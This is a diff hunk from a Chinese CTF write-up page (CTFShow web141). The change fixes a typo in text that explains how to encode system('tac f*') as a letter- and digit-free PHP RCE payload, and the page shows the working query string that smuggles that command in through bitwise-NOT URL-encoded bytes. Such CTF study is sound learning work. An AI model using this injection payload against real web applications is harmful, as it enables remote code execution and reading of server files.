@@ -1190,7 +1190,7 @@
 </ul>
 <p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web141_3.png"></p>
 <ul>
-<li>如图所示: 在上一步上依此类推可以构造出 system(“tac f*”); 而在本题当中 需要 将 system(“tac f*”) 此命令编程 无字母数字的 RCE： (<del>%8C%86%8C%8B%9A%92)(</del>%8B%9E%9C%DF%99%D5)</li>
+<li>如图所示: 在上一步上依此类推可以构造出 system(“tac f*”); 而在本题当中 需要 将 system(“tac f*”) 此命令变成 无字母数字的 RCE： (<del>%8C%86%8C%8B%9A%92)(</del>%8B%9E%9C%DF%99%D5)</li>
 </ul>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="number">2</span>&amp;v3=<span class="number">1</span>-(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">8</span>B%<span class="number">9</span>E%<span class="number">9</span>C%DF%<span class="number">99</span>%D5)*<span class="number">2</span></span><br></pre></td></tr></table></figure>
 
